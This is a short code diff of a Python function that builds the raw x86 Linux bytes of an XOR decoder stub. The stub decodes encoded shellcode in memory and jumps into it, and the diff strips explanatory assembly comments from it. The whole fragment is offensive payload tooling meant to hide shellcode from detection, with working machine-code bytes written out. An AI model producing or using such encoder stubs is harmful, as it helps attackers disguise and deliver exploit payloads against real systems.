@@ -99,29 +99,15 @@ def create_decoder_stub_xor(key: int = 0xAA, shellcode_size: int = 0) -> bytes:
     Returns:
         Decoder stub bytes
     """
-    # Simple XOR decoder for x86 Linux
-    # jmp short call_shellcode
-    # decoder:
-    #   pop esi              ; get address of encoded shellcode
-    #   xor ecx, ecx
-    #   mov cl, shellcode_size
-    # decode:
-    #   xor byte [esi], key
-    #   inc esi
-    #   loop decode
-    #   jmp short shellcode
-    # call_shellcode:
-    #   call decoder
-    #   ; encoded shellcode follows
 
     decoder = (
         b"\xeb\x0b"  # jmp short call_shellcode
         b"\x5e"  # pop esi
         b"\x31\xc9"  # xor ecx, ecx
         b"\xb1"
-        + bytes([shellcode_size & 0xFF])  # mov cl, size
+        + bytes([shellcode_size & 0xFF])
         + b"\x80\x36"
-        + bytes([key])  # xor byte [esi], key
+        + bytes([key])
         + b"\x46"  # inc esi
         b"\xe2\xfa"  # loop decode
         b"\xeb\x05"  # jmp short shellcode
